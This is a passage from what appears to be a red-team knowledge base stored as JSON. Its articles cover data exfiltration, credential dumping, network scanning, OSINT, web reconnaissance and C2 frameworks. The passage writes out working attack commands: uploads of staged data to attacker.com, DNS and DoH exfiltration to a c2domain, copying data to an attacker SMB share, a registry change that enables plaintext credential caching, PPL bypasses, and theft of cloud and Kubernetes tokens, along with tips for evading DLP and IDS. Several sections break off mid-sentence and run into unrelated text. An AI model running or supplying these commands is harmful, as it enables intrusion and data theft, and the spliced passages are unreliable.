monitoring.\n\n## Data Discovery\n\n**Windows**:\n```cmd\n:: Search for sensitive files by content\nfindstr /SI /M \"password\" *.txt *.ini *.config *.xml *.cfg\nfindstr /SI /M \"connectionString\" *.config *.xml\ndir /s /b *.kdbx *.key *.pfx *.p12 *.pem *.ppk 2>nul\n\n:: PowerShell recursive search\nGet-ChildItem 2>/dev/null\ngrep -rIl \"password\\|secret\\|api_key\\|token\" /etc/ /opt/ /var/www/ /home/ 2>/dev/null | head -50\n```\n\n**Database enumeration**:\n```sql\n-- List all databases/tables for targeted extraction\nSHOW DATABASES;\nSELECT table_name, table_rows FROM information_schema.tables WHERE table_schema='target_db' ORDER BY table_rows DESC;\n```\n\n## Data Staging\n\nBefore exfiltration, compress and encrypt data to reduce size and prevent content inspection:\n\n```bash\n# Compress + encrypt (Linux)\ntar czf - /path/to/data | gpg -c --cipher-algo AES256 --passphrase 'strong_key' -o staged.tar.gz.gpg\n\n# 7-Zip with AES-256 (Windows)\n7z a -p\"strong_key\" -mhe=on staged.7z C:\\data\\sensitive\\\n\n# Split large archives\nsplit -b 50M staged.tar.gz.gpg staged_part_\n```\n\nAlways encrypt before exfiltration — plaintext transfer is detectable by DLP/IDS content inspection.\n\n## HTTPS Exfiltration\n\n```bash\n# Direct upload to attacker server\ncurl -X POST -F \"file=@staged.7z\" https://attacker.com/upload\n\n# Cloud storage APIs (blends with legitimate traffic):\n# OneDrive (Microsoft Graph API)\ncurl -H \"Authorization: Bearer $TOKEN\" \\\n -H \"Content-Type: application/octet-stream\" \\\n -X PUT \"https://graph.microsoft.com/v1.0/me/drive/root:/exfil/data.7z:/content\" \\\n --data-binary @staged.7z\n\n# AWS S3 presigned URL\naws s3 presign s3://exfil-bucket/data.7z --expires-in 3600\ncurl -X PUT -T staged.7z \"PRESIGNED_URL\"\n\n# Slack file upload\ncurl -F file=@staged.7z -F channels=C0123456 -H \"Authorization: Bearer xoxb-TOKEN\" \\\n https://slack.com/api/files.upload\n```\n\n## DNS Exfiltration\n\nEncode data in DNS subdomain labels (works when only DNS egress is available):\n\n```bash\n# Base32 encode data, split into 63-char labels (DNS label limit)\nbase32 staged.7z | fold -w 63 | while read chunk; do\n dig +short \"$chunk.c2domain.com\" @resolver\ndone\n\n# dnscat2 (bidirectional DNS tunnel)\n# Server: dnscat2-server c2domain.com\n# Client: dnscat2 c2domain.com\n\n# iodine (IP-over-DNS)\n# Create tun interface over DNS queries\n```\n\nDNS exfil is slow (~50 bytes per query) but extremely difficult to block since DNS is required for network operation.\n\n## SMB/WebDAV Exfiltration\n\n```cmd\n:: Copy to attacker's SMB share\ncopy staged.7z \\\\attacker_ip\\share\\\n\n:: WebDAV (if SMB over HTTPS (DoH) Exfiltration\n\n```bash\n# Use DoH endpoints to tunnel DNS exfil through HTTPS\n# Traffic appears as HTTPS to dns.google.com or cloudflare-dns.com\ncurl -H \"Accept: application/dns-message\" \\\n \"https://dns.google.com/resolve?name=ENCODED_DATA.c2domain.com&type=A\"\n```\n\n## Rate Limiting for DLP Evasion\n\n- Exfiltrate during business hours to blend with normal traffic\n- Match upload sizes to typical file sharing patterns\n- Use legitimate cloud services the organization already uses\n- Spread exfil over days/weeks for large datasets\n- Monitor for DLP alerts during exfil (if you have SOC visibility)\n\n## OpSec Notes\n\n- Encryption before exfil prevents content-based DLP detection\n- Cloud API exfil through legitimate services is hardest to extraction for red team operations.\n\n## LSASS Protection Mechanisms\n\n**RunAsPPL (Protected Process Light)**:\n```cmd\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL\n```\nWhen enabled, LSASS runs as a Protected Process Light, preventing standard process handle access even from administrators.\n\n**Credential Guard**: Uses Virtualization Based Security (VBS) to isolate credential material in VTL1 (Secure World). Protected credentials are inaccessible from the normal OS (VTL0). Check status:\n```powershell\nGet-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard |\n Select-Object SecurityServicesRunning, VirtualizationBasedSecurityStatus\n```\n\n## Dumping Methods Without Touching LSASS Directly\n\nWhen LSASS is heavily monitored, use alternative credential sources:\n\n**DCSync** (from domain-joined dumping yields empty results for protected logons. Alternatives:\n\n1. **DCSync**: Pulls from DC directly, not from local LSASS\n2. **ADCS certificate theft**: Request certificate, authenticate via PKINIT\n3. **DPAPI offline with domain backup key**: Decrypt credential blobs using the domain backup key\n4. **Kerberoasting/ASREPRoasting**: Request tickets offline, crack hashes\n5. **Shadow Credentials**: Add KeyCredential to user object, authenticate via certificate\n6. **Token impersonation**: Use existing logon tokens (not from LSASS)\n\n## PPL Bypass Methods\n\n1. **Vulnerable signed drivers**: Load a vulnerable signed driver to remove PPL (PPLKiller, PPLdump)\n2. **mimidrv.sys**: Mimikatz kernel driver (requires driver loading capability)\n3. **Kernel exploit**: Exploit kernel vulnerability to modify EPROCESS protection level\n4. **Admin debug tools**: Some signed debugging tools can access PPL processes\n\n## WDigest Credential Caching\n\n```cmd\n:: Enable plaintext credential caching (requires admin)\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n\n:: New logon sessions will cache plaintext credentials\n:: Wait for user to re-authenticate (lock/unlock, new logon)\n:: Then dump LSASS — WDigest section contains plaintext passwords\n```\n\n## Cached Domain Credentials (DCC2)\n\nExtracted from the SECURITY registry hive. This generates network traffic and log entries that may trigger alerts.\n\n## Port Scanning\n\n**Nmap** remains the gold standard. Key scan strategies:\n\n```bash\n# SYN scan (default, fast, stealthy — requires root)\nnmap -sS -p- -T4 --min-rate=1000 -oA full_syn target.com\n\n# TCP connect scan (no root needed, noisier)\nnmap -sT -p 80,443,8080,8443 target.com\n\n# UDP scan (slow, essential for SNMP/DNS/TFTP)\nnmap -sU --top-ports 200 -T4 target.com\n\n# Version and script scan on discovered ports\nnmap -sV -sC -p 22,80,443,445,3389 -oA detailed target.com\n\n# OS fingerprinting\nnmap -O --osscan-guess target.com\n```\n\n**masscan** for speed on large ranges (entire /16 in minutes):\n\n```bash\nmasscan 10.0.0.0/16 -p 1-65535 --rate=10000 -oJ masscan_results.json\n```\n\n**rustscan** and **naabu** provide fast port discovery as Nmap alternatives:\n\n```bash\nnaabu -host target.com -p - -rate 5000 -o ports.txt\nrustscan -a target.com --ulimit 5000 -- -sV -sC\n```\n\n## Nmap NSE Scripts\n\nNSE scripts provide targeted service enumeration:\n\n```bash\n# SMB enumeration\nnmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 target\n\n# HTTP enumeration\nnmap --script http-enum,http-headers,http-methods -p 80,443 target\n\n# Vulnerability scanning\nnmap --script vuln -p 80,443 target\n\n# SSL/TLS analysis\nnmap --script ssl-enum-ciphers,ssl-cert -p 443 target\n```\n\n## DNS Enumeration\n\nSubdomain discovery is critical for expanding attack surface:\n\n```bash\n# Passive subdomain enumeration\nsubfinder -d target.com -all -o subs.txt\nassetfinder --subs-only target.com >> subs.txt\n\n# Active DNS brute-force\ndnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o dnsx_brute.txt\n\n# DNS resolution and filtering live hosts\ncat subs.txt | sort -u | dnsx -silent -a -resp -o resolved.txt\n\n# Permutation/alteration discovery\naltdns -i subs.txt -o altered.txt -w words.txt -r -s resolved_altered.txt\n\n# Zone transfer (rare but devastating when found)\ndig axfr @ns1.target.com target.com\n```\n\n## WAF Detection & Bypass\n\nIdentify WAF before attacking web applications:\n\n```bash\nwafw00f https://target.com\n```\n\nCDN bypass techniques: find the origin IP behind CloudFlare/Akamai using historical DNS records (SecurityTrails), certificate search (Censys), or by finding subdomains that resolve directly to the origin. Check `mail.target.com`, `ftp.target.com`, or internal subdomains that may bypass CDN.\n\n## Virtual Host Discovery\n\n```bash\n# Discover vhosts on shared hosting\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\\n -u https://TARGET_IP -H \"Host: FUZZ.target.com\" -fs 0\n\n# Compare response sizes to filter false positives\n```\n\n## Content Discovery\n\n```bash\n# Directory brute-force\nferoxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,asp,aspx,jsp -t 50\n\n# Recursive with extensions\ngobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 50 -o gobuster.txt\n\n# ffuf for flexible fuzzing\nffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -fc 404\n```\n\n## Banner Grabbing\n\n```bash\n# Netcat banner grab\nnc -v target.com 22\nnc -v target.com 25\n\n# Curl for HTTP headers\ncurl -I -s https://target.com\n\n# OpenSSL for TLS services\necho | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -subject -issuer -dates\n```\n\n## Port Knocking Detection\n\nSome services hide behind port knocking sequences. Use `nmap` with timing analysis or try common knock sequences. `knockd` configurations may be found through other compromise vectors.\n\n## OpSec Considerations\n\n- SYN scans are logged by IDS/IPS — use `--scan-delay` and fragmentation (`-f`) to reduce signature matching\n- Scan from infrastructure with appropriate categorization (cloud VPS, not residential IP)\n- Distribute scans over time to avoid rate-based alerts\n- Use `--randomize-hosts` with Nmap to avoid sequential scanning patterns\n- Consider scanning through Tor/VPN for initial reconnaissance, then switching to dedicated infrastructure for active exploitation\n\n## Detection Notes\n\nPort scans generate connection logs. IDS signatures (Snort/Suricata) detect Nmap fingerprinting. Aggressive scanning with high packet rates triggers rate-based alerts. NSE script scans are particularly noisy as they generate application-layer traffic. This is the most reliable method for local subnet enumeration.\n\n## ICMP & Layer 3 Probing\n\n```bash\n# Ping sweep\nnmap -sn 10.0.0.0/24\n\n# Traceroute for path analysis\ntraceroute -I target_ip # ICMP\ntraceroute -T -p 443 target_ip # TCP (bypasses ICMP filtering)\ntraceroute -U target_ip # UDP\n\n# Map multiple subnets with parallel pings\nfor i in $(seq 1 254); do ping -c1 -W1 10.0.$i.1 & done 2>/dev/null | grep \"bytes from\"\n```\n\nTraceroute output reveals router hops, network segmentation boundaries, and potential firewall locations (where TTL-exceeded responses stop).\n\n## NetBIOS & SMB Enumeration\n\n```bash\n# NetBIOS name scan\nnbtscan 192.168.1.0/24\n\n# SMB null session enumeration\nenum4linux -a target_ip\nsmbclient -N -L //target_ip\n\n# CrackMapExec for mass SMB enum\ncrackmapexec smb 10.0.0.0/24 --shares\ncrackmapexec smb 10.0.0.0/24 --users\ncrackmapexec smb 10.0.0.0/24 --groups\n```\n\nSMB null sessions on older/misconfigured systems reveal domain users, groups, shares, and password policies — critical intelligence for password spraying.\n\n## SNMP Enumeration\n\nSNMP v1/v2c with default community strings exposes extensive host information:\n\n```bash\n# Community string brute-force\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.0.0.0/24\n\n# Full SNMP walk\nsnmpwalk -v2c -c public target_ip\n\n# Specific OIDs for high-value data\nsnmpwalk -v2c -c public target_ip 1.3.6.1.2.1.25.4.2.1.2 # Running processes\nsnmpwalk -v2c -c public target_ip 1.3.6.1.4.1.77.1.2.25 # User accounts\nsnmpwalk -v2c -c public target_ip 1.3.6.1.2.1.6.13.1.3 # TCP connections\nsnmpwalk -v2c -c public target_ip 1.3.6.1.2.1.25.6.3.1.2 # Installed software\n```\n\nSNMP v3 requires credentials but is occasionally misconfigured with NoAuthNoPriv.\n\n## LLMNR/NBT-NS/mDNS Poisoning for Mapping\n\nRunning **Responder** in analyze mode (no poisoning) passively maps hosts that send broadcast name resolution queries:\n\n```bash\nresponder -I eth0 -A\n```\n\nThis reveals hostnames, domain membership, and which services hosts are attempting to reach — without any active poisoning that could disrupt the network.\n\n## IPv6 Discovery\n\nMany networks deploy IPv6 alongside IPv4 but forget to apply equivalent security controls:\n\n```bash\n# IPv6 neighbor discovery\nping6 -c2 ff02::1%eth0\nip -6 neigh show\n\n# Nmap IPv6 scan\nnmap -6 -sn fe80::/10%eth0\n```\n\nIPv6 link-local addresses (`fe80::`) are always present on modern systems. SLAAC-derived addresses encode the MAC address, providing hardware fingerprinting.\n\n## Service Discovery Protocols\n\n```bash\n# SSDP/UPnP discovery\ngssdp-discover --timeout=5\n\n# mDNS/Bonjour\navahi-browse -a -t -r\n\n# LLMNR passive listening\ntcpdump -i eth0 port 5355\n```\n\n## Cloud Metadata Endpoints\n\nFrom a compromised cloud instance, the metadata service reveals credentials and network configuration:\n\n```bash\n# AWS IMDSv1 (if not enforced to v2)\ncurl http://169.254.169.254/latest/meta-data/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# Azure IMDS\ncurl -H \"Metadata: true\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\"\n\n# GCP\ncurl -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/\n\n# Alibaba Cloud\ncurl http://100.100.100.200/latest/meta-data/\n```\n\n## Kubernetes API Discovery\n\n```bash\n# Check for unauthenticated API server\ncurl -k https://kubernetes_ip:6443/api/v1/namespaces\ncurl -k https://kubernetes_ip:10250/pods # Kubelet\n\n# From inside a pod\ncat /var/run/secrets/kubernetes.io/serviceaccount/token\ncurl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces\n```\n\n## Network Mapping Tools\n\nConsolidate findings into network maps using tools like **Graphviz**, **draw.io**, or **BloodHound** (for AD environments). Document subnets, VLANs, trust boundaries, and high-value targets for attack path planning.\n\n## OpSec Notes\n\n- ARP scans are invisible to network IDS but may be logged by NAC solutions\n- SNMP walks generate significant traffic — rate limit queries\n- Avoid aggressive ICMP sweeps; prefer targeted probing based on known subnet ranges\n- LLMNR/NBT-NS analyze mode is completely passive and safe\n- Cloud metadata queries are logged in cloud audit trails (CloudTrail, Azure Activity Log)\n\n---\n\n## VLAN Hopping\n\nVLANs are not security boundaries — misconfigured trunking enables cross-VLAN access:\n\n```bash\n# Switch Spoofing: negotiate trunk link with DTP (Dynamic Trunking Protocol)\n# Requires: switch port in auto/desirable DTP mode (Cisco default on older switches)\nsudo apt install vlan\nsudo modprobe 8021q\n\n# Yersinia: DTP trunk negotiation\nsudo yersinia dtp -attack 1 # enable trunking on connected port\n# Once trunk established: add sub-interfaces for each VLAN\nsudo ip link add link eth0 name eth0.20 type vlan id 20\nsudo ip addr add 192.168.20.50/24 dev eth0.20\nsudo ip link set eth0.20 up\n\n# Double Tagging (one-way — attacker VLAN must match native VLAN):\n# Craft frame with two 802.1Q tags: outer=native VLAN, inner=target VLAN\n# First switch strips outer tag, second switch forwards to target VLAN\n# Limitation: replies don't come back (need asymmetric path)\nfrom scapy.all import *\npkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst=\"192.168.20.1\")/ICMP()\nsendp(pkt, iface=\"eth0\")\n\n# Netdiscover: passive/active ARP host discovery\nsudo apt install netdiscover\nsudo netdiscover -r 192.168.1.0/24 # active ARP sweep\nsudo netdiscover -p # passive mode (just listen)\nsudo netdiscover -i eth0 -r 10.0.0.0/8 # larger range\n```\n\n---\n\n## Routing Table Enumeration (Post-Compromise)\n\n```bash\n# Windows: reveal network segments reachable from compromised host\nroute print\nnetstat -rn\nipconfig /all\n\n# Linux\nip route show\nip neigh show # ARP cache → discovered hosts\ncat /proc/net/route # raw routing table\n\n# Identify dual-homed hosts (multiple network interfaces — ideal pivot points)\n# Windows: ipconfig /all | findstr \"IPv4\\|Subnet\\|Default\"\n# Linux: ip addr show | grep \"inet \"\n```", "last_updated": "2026-03-17"}, "passive-recon": {"slug": "passive-recon", "title": "Passive Reconnaissance & OSINT", "category": "Reconnaissance", "content": "# Passive Reconnaissance & OSINT\n\nPassive reconnaissance gathers intelligence without directly touching target infrastructure. No packets are sent to target-owned assets, making this phase virtually undetectable.\n\n## Search Engine & Internet-Wide Scanning Databases\n\n**Shodan** indexes internet-facing services. Useful queries:\n\n```\n# Find organization assets\norg:\"Target Corp\"\nssl.cert.subject.cn:\"target.com\"\nhostname:\"target.com\" port:443\nnet:\"203.0.113.0/24\"\n\n# Specific service hunting\nhttp.title:\"Dashboard\" org:\"Target Corp\"\nproduct:\"Apache\" org:\"Target Corp\" port:8080\n```\n\n**Censys** provides similar capability with certificate-centric search. Use `services.tls.certificates.leaf.subject.common_name:target.com` for cert-based discovery. **FOFA** (`fofa.info`) and **ZoomEye** cover Chinese IP space better than Shodan. **GreyNoise** is useful for identifying which IPs are mass-scanning versus targeted — check if your test infrastructure is already being scanned.\n\n## Certificate Transparency\n\nQuery `crt.sh` for all certificates ever issued for a domain:\n\n```bash\ncurl -s \"https://crt.sh/?q=%.target.com&output=json\" | jq -r '.[].name_value' | sort -u\n```\n\nThis reveals subdomains that may not appear in DNS brute-forcing, including internal hostnames accidentally included in SAN fields. **SecurityTrails** and **RiskIQ PassiveTotal** provide historical DNS records, revealing previous IP resolutions, nameserver changes, and infrastructure migrations.\n\n## ASN & Network Block Enumeration\n\nUse `bgp.he.net` to identify all ASNs owned by the target. Cross-reference with ARIN/RIPE WHOIS databases:\n\n```bash\nwhois -h whois.radb.net -- '-i origin AS12345' | grep route:\namass intel -org \"Target Corporation\"\n```\n\nThis yields network blocks that may host forgotten assets outside the primary domain.\n\n## Email Harvesting\n\n**theHarvester** aggregates results from multiple search engines:\n\n```bash\ntheHarvester -d target.com -b google,bing,linkedin,dnsdumpster,crtsh -l 500\n```\n\n**Hunter.io** provides email pattern detection (first.last@, f.last@) and verified addresses. Cross-reference with **LinkedIn** employee enumeration for password spraying username lists. Use LinkedIn Sales Navigator or scraping tools (linkedin2username) to build employee lists organized by department.\n\n## Google Dorking\n\nHigh-value dorks for target reconnaissance:\n\n```\nsite:target.com filetype:pdf\nsite:target.com inurl:admin OR inurl:login OR inurl:dashboard\nsite:target.com ext:xml OR ext:json OR ext:yaml OR ext:conf\nsite:target.com intitle:\"index of\"\n\"target.com\" filetype:xls OR filetype:csv \"password\" OR \"username\"\nsite:pastebin.com \"target.com\"\n```\n\n## GitHub & Code Repository Dorking\n\nSearch for leaked secrets in public repositories:\n\n```bash\n# truffleHog for entropy-based secret detection\ntrufflehog github --org=targetcorp\n\n# gitleaks against cloned repos\ngitleaks detect -s /path/to/repo --report-format json\n\n# GitHub search queries\norg:targetcorp password\norg:targetcorp AWS_SECRET_ACCESS_KEY\norg:targetcorp filename:.env\norg:targetcorp extension:pem private\n```\n\n**Gitrob** and **git-secrets** provide automated scanning. Check commit history — secrets removed from HEAD often remain in git log.\n\n## Recon Frameworks\n\n**Amass** (passive mode) aggregates from 40+ data sources:\n\n```bash\namass enum -passive -d target.com -o amass_passive.txt\n```\n\n**Recon-ng** provides a modular framework with marketplace modules:\n\n```\nrecon-ng\nmarketplace install all\nmodules load recon/domains-hosts/certificate_transparency\noptions set SOURCE target.com\nrun\n```\n\n**Maltego** excels at visualizing relationships between entities (domains, IPs, people, organizations) through transforms.\n\n## Historical Data\n\n**Wayback Machine** via `waybackurls` reveals endpoints that may still be live but unlinked:\n\n```bash\nwaybackurls target.com | grep -E '\\.(js|json|xml|config|env|bak|sql)$' | sort -u\n```\n\nOld JavaScript files may contain API keys, internal endpoints, or authentication logic that has since been removed from the live site but remains functional server-side.\n\n## Pastebin & Paste Site Monitoring\n\nMonitor paste sites for leaked credentials, configuration files, and internal documents. Tools like **PasteHunter** automate this with keyword alerts. Check Pastebin, Ghostbin, GitHub Gists, and PrivateBin instances.\n\n## OpSec Notes\n\n- Passive recon generates no alerts on the target side\n- Use VPN/Tor when querying Shodan/Censys to avoid correlating your research IP with later active phases\n- Rate-limit API queries to avoid account suspension\n- Store all findings in a structured format (JSON/CSV) for later cross-referencing during active phases\n\n## Detection Notes\n\nPassive recon is invisible to the target. However, some services (SecurityTrails, Shodan) log API queries. If the target operates a threat intelligence program, they may monitor for increased OSINT activity against their domain via commercial TI feeds.\n\n---\n\n## SpiderFoot — Automated OSINT\n\nSpiderFoot automates collection across 200+ data sources:\n\n```bash\n# Install\npip3 install spiderfoot\n# or Docker:\ndocker run -p 5001:5001 smicallef/spiderfoot\n\n# CLI mode\nspiderfoot -s target.com -t INTERNET_NAME,EMAILADDR,PHONE_NUMBER \\\n -m sfp_shodan,sfp_hunter,sfp_censys,sfp_haveibeenpwned \\\n -o /tmp/sf_output.json\n\n# Web UI (http://localhost:5001): configure modules, set target, run scan\n# Correlates: emails, IPs, domains, usernames, breaches, social media, dark web\n\n# Useful modules: sfp_dnsbrute, sfp_github, sfp_pastebin,\n# sfp_instagram, sfp_twitter, sfp_linkedin2\n```\n\n---\n\n## Dark Web Monitoring\n\n```bash\n# Tor-based search engines\n# Ahmia (clearnet): https://ahmia.fi — indexes .onion sites\n# Torch: http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dyd.onion\n# Haystack: large .onion index\n\n# Access via Tor\nsudo apt install tor torbrowser-launcher\n# Set SOCKS5 proxy: 127.0.0.1:9050 in curl/requests\n\n# Search for target data on paste sites\n# Pastebin OSINT: site:pastebin.com \"target.com\"\n# GitHub secrets: site:github.com \"target.com\" \"password\" OR \"api_key\"\n\n# BreachDirectory API\ncurl \"https://breachdirectory.org/api?func=auto&term=target.com\" \\\n -H \"Authorization: YOUR_API_KEY\"\n\n# Dark web monitoring services (for client deliverables):\n# SpyCloud, Flare, DarkOwl — monitor for brand/employee exposure\n```\n\n---\n\n## Username OSINT (Sherlock)\n\n```bash\n# Find username across 400+ platforms\npip3 install sherlock-project\nsherlock username_here\n\n# Useful for:\n# - Each technology has known attack vectors.\n\n## Web Crawling & Spidering\n\n```bash\n# Katana (ProjectDiscovery — fast, headless browser support)\nkatana -u https://target.com -d 5 -jc -o katana_output.txt\n\n# GoSpider\ngospider -s https://target.com -d 3 -c 10 --other-source --include-subs -o gospider_out\n\n# Hakrawler\necho https://target.com | hakrawler -d 3 -u\n```\n\nCombine crawler output with wayback data for maximum endpoint coverage:\n\n```bash\ncat katana_output.txt wayback_urls.txt | sort -u | httpx -silent -mc 200 -o live_endpoints.txt\n```\n\n## JavaScript Analysis\n\nModern SPAs embed API endpoints, credentials, and business logic in JavaScript:\n\n```bash\n# LinkFinder — extract endpoints from JS\nlinkfinder -i https://target.com -d -o cli\n\n# SecretFinder — find secrets in JS\nsecretfinder -i https://target.com -e\n\n# JSLuice — advanced JS analysis\njsluice urls -R target_js_files/\njsluice secrets -R target_js_files/\n\n# Bulk download and analyze JS files\ncat live_endpoints.txt | grep -iE '\\.js$' | while read url; do\n curl -sL \"$url\" >> all_js.txt\ndone\n```\n\nLook for: API keys, AWS credentials, Firebase configs, internal API URLs, debug endpoints, hardcoded tokens, admin routes.\n\n## Parameter Discovery\n\n```bash\n# Arjun — automatic parameter discovery\narjun -u https://target.com/api/endpoint -m GET POST\n\n# x8 — fast parameter discovery\nx8 -u https://target.com/search -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt\n```\n\nHidden parameters may enable debug modes (`debug=true`, `test=1`), bypass authentication, or expose injection points.\n\n## API Endpoint Discovery\n\n```bash\n# Check common API documentation paths\nfor path in /swagger.json /swagger/v1/swagger.json /api-docs /openapi.json /v2/api-docs /.well-known/openapi.yaml /graphql /graphiql; do\n code=$(curl -so /dev/null -w '%{http_code}' \"https://target.com$path\")\n echo \"$path: $code\"\ndone\n\n# Kiterunner for API path brute-force\nkr scan https://target.com -w /path/to/routes-large.kite -x 10\n```\n\n## Subdomain Takeover Detection\n\nDangling DNS records pointing to deprovisioned cloud resources can be claimed:\n\n```bash\n# subjack\nsubjack -w subs.txt -t 100 -timeout 30 -o takeovers.txt -ssl\n\n# Nuclei with takeover templates\nnuclei -l subs.txt -t /path/to/nuclei-templates/takeovers/ -o takeover_results.txt\n```\n\nCommon targets: unclaimed S3 buckets, deprovisioned Heroku/Azure/GitHub Pages apps, abandoned Fastly/CloudFront distributions.\n\n## Cloud Storage Enumeration\n\n```bash\n# cloud_enum — multi-cloud bucket/blob enumeration\ncloud_enum -k target -k targetcorp -l cloud_enum_results.txt\n\n# S3 scanner\ns3scanner scan --bucket-file potential_buckets.txt\n\n# Manual checks\naws s3 ls s3://target-backup --no-sign-request\n```\n\n## robots.txt, sitemap.xml & Metadata\n\n```bash\ncurl -s https://target.com/robots.txt\ncurl -s https://target.com/sitemap.xml\ncurl -s https://target.com/.well-known/security.txt\n```\n\n`robots.txt` Disallow entries reveal sensitive paths the site owner wants hidden from crawlers. Sitemaps expose the full URL structure.\n\n## CORS Misconfiguration Detection\n\n```bash\n# Test for reflected origin\ncurl -sI -H \"Origin: https://evil.com\" https://target.com/api/data | grep -i access-control\n\n# Test for null origin\ncurl -sI -H \"Origin: null\" https://target.com/api/data | grep -i access-control\n```\n\nIf `Access-Control-Allow-Origin` reflects the attacker's origin with `Access-Control-Allow-Credentials: true`, cross-origin data theft is possible.\n\n## Header Analysis\n\n```bash\ncurl -sI https://target.com | grep -iE 'strict-transport|content-security|x-frame|x-content-type|referrer-policy|permissions-policy'\n```\n\nMissing security headers indicate weaker security posture: no CSP means easier XSS, no X-Frame-Options enables clickjacking, no HSTS allows SSL stripping.\n\n## OpSec Notes\n\n- Web crawling generates extensive access logs — use realistic User-Agent strings\n- Rate-limit all brute-force discovery to avoid 429/ban\n- Some WAFs detect sequential path enumeration — add jitter and randomize word order\n- JS analysis can be done offline after downloading files, reducing target interaction\n- Subdomain takeover tests should be non-destructive (verify DNS, don't claim)\n\n## Detection Notes\n\nAggressive directory brute-forcing generates thousands of 404 responses, easily detected by WAFs and SIEM rules. Parameter fuzzing may trigger application-level alerts. Use targeted wordlists over massive dictionaries to reduce noise.", "last_updated": "2026-03-12"}, "c2-framework-comparison": {"slug": "c2-framework-comparison", "title": "C2 Framework Comparison 2025-2026", "category": "Red Team Ops", "content": "# C2 Framework Comparison 2025-2026\n\nComprehensive comparison of major command-and-control frameworks for red team operations, including selection criteria and trade-offs.\n\n## Cobalt Strike\n\n**Type**: Commercial ($5,900/year per operator)\n\n**Agent**: Beacon (Windows primary, cross-platform via BOFs/reflective DLL)\n\n**Key Features**:\n- Malleable C2 profiles (highly configurable traffic shaping)\n- Beacon Object Files (BOF) for in-memory post-exploitation modules\n- Sleep mask for memory encryption during sleep\n- Named pipe and TCP for internal peer-to-peer\n- Aggressor Script for automation\n- Multi-operator support (team server model)\n\n**Strengths**: Industry standard, massive community knowledge base, BOF ecosystem, proven at scale.\n\n**Weaknesses**: Heavily signatured by every EDR vendor. Leaked versions (4.x) used by threat actors, increasing default detection. License enforcement limits distribution. Default payloads require significant customization to evade modern EDR.\n\n**Best For**: Teams with budget, need for malleable C2, and ability to customize.\n\n## Sliver\n\n**Type**: Open source (Go)\n\n**Agent**: Implant (Windows/macOS/Linux)\n\n**Key Features**:\n- mTLS, HTTP/S, WireGuard, DNS transports\n- Multiplayer mode (multi-operator)\n- BOF support via COFF loader\n- Armory for community extensions\n- Cursed Chrome for browser pivoting\n- Built-in staging and stagers\n- Active development with regular releases\n\n**Strengths**: Free, cross-platform, good transport variety, active community, built-in evasion features (obfuscation, symbol stripping), OPSEC-focused design.\n\n**Weaknesses**: Growing detection coverage by EDR vendors. Limited malleable profile flexibility compared to Cobalt Strike. Fewer post-exploitation modules than commercial options.\n\n**Best For**: Budget-conscious teams, Linux/macOS targets, teams wanting open-source flexibility.\n\n## Havoc\n\n**Type**: Open source (C/C++ agent, Python team server)\n\n**Agent**: Demon\n\n**Key Features**:\n- Indirect syscalls built-in\n- Sleep obfuscation (Ekko, Foliage variants)\n- Module stomping\n- Stack spoofing\n- Custom reflective loader\n- Havoc profiles for traffic configuration\n- Python team server API for extensibility\n- BOF support\n\n**Strengths**: Modern evasion techniques built into the agent. Strong Windows evasion focus. Active development. Designed for 2023+ EDR landscape.\n\n**Weaknesses**: Windows-only agent (Demon). Smaller community than Cobalt Strike/Sliver. Less mature infrastructure management. Limited transport options compared to Sliver.\n\n**Best For**: Windows-focused engagements requiring strong EDR evasion.\n\n## Mythic\n\n**Type**: Open source (Docker-based, multi-agent)\n\n**Agent**: Multiple (Apollo, Athena, Poseidon, Medusa, and more)\n\n**Key Features**:\n- Container-based architecture (agents, C2 profiles, translation containers)\n- Multiple agent types for different platforms and languages\n- Extensive logging and audit trail\n- Web-based UI with real-time updates\n- Payload services for dynamic payload generation\n- MITRE ATT&CK mapping built-in\n- Multi-operator support\n\n**Strengths**: Extremely modular architecture. Best logging/auditing for compliance-heavy engagements. Multiple agent choices. Good for building custom agents within the framework. Strong purple team features.\n\n**Weaknesses**: Complexity (Docker dependency, container management). Agent quality varies by implementation. Higher resource requirements. Steeper learning curve.\n\n**Best For**: Large teams, compliance-focused engagements, organizations wanting framework flexibility.\n\n## Brute Ratel\n\n**Type**: Commercial ($2,500/year)\n\n**Agent**: Badger\n\n**Key Features**:\n- Designed specifically for EDR evasion\n- Indirect syscalls, stack spoofing\n- Sleep obfuscation\n- ETW/AMSI bypass\n- SMB/TCP for internal comms\n- Malleable profiles\n- Built-in keylogger, screenshot\n\n**Strengths**: Strong evasion capabilities out of the box. Less signatured than Cobalt Strike (smaller user base). Modern evasion techniques.\n\n**Weaknesses**: Smaller community. Less documentation. Leaked version increased detection coverage. Limited extensibility compared to CS/Mythic. Vendor lock-in.\n\n**Best For**: Teams focused on EDR evasion with budget for commercial tooling.\n\n## Nighthawk (MDSec)\n\n**Type**: Commercial (expensive, limited distribution)\n\n**Agent**: Custom\n\n**Key Features**: Advanced evasion, limited customer base (reduces signature coverage), MDSec research-backed techniques.\n\n**Best For**: Well-funded teams requiring maximum evasion. Best for vulnerability exploitation phase. Excellent pivoting. Community support.\n\n**Weaknesses**: Heavily signatured. Meterpreter is caught by most EDR. Not designed for 